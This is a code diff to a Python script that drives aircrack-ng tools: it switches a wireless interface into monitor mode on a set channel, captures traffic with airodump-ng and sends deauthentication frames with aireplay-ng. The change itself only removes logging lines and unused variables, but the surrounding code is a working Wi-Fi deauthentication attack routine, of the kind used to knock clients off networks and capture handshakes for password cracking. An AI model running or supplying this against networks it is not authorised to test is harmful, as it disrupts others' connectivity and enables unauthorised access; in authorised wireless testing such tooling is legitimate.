@@ -39,13 +39,11 @@ def put_interface_in_same_channel(iface: str, channel: str):
     logging.info("putting interface in channel %s", channel)
 
     cmd = ["sudo", "airmon-ng", "stop", iface]
-    iface_down_output = subprocess.run(cmd, capture_output=True, text=True)
-    #print(iface_down_output.stdout)
-
+    subprocess.run(cmd, capture_output=True, text=True)
+    
     cmd = ["sudo", "airmon-ng", "start", iface, channel]
-    iface_up_output = subprocess.run(cmd, capture_output=True, text=True)
-    #print(iface_up_output.stdout)
-
+    subprocess.run(cmd, capture_output=True, text=True)
+    
 def start_airodump(airodump_args, stop_event):
     logging.info("inside start_airodump")
     cmd = [
@@ -58,14 +56,10 @@ def start_airodump(airodump_args, stop_event):
 
     while not stop_event.is_set():
         time.sleep(0.5)
-
-    logging.info("stopping airodump-ng")
     proc.terminate()
     proc.wait()
-    logging.info("airmon-ng thread complete")
 
 def send_deauths(aireplay_args, stop_event):
-    logging.info("inside send_deauths function")
     put_interface_in_same_channel(aireplay_args["interface"], "6")
     cmd = [
         "sudo", "aireplay-ng", "--deauth", str(aireplay_args["deauths"]),
@@ -75,7 +69,6 @@ def send_deauths(aireplay_args, stop_event):
     proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     while not stop_event.is_set():
-        logging.info("sending deauth")
         if proc.poll() is not None:
             break  # command finished
         time.sleep(0.5)
@@ -84,8 +77,6 @@ def send_deauths(aireplay_args, stop_event):
         logging.info("stopping aireplay-ng")
         proc.terminate()
         proc.wait()
-    
-    logging.info("deauths thread complete")
 
 def kill_conflicting_processes():
     subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True, text=True, check=True)
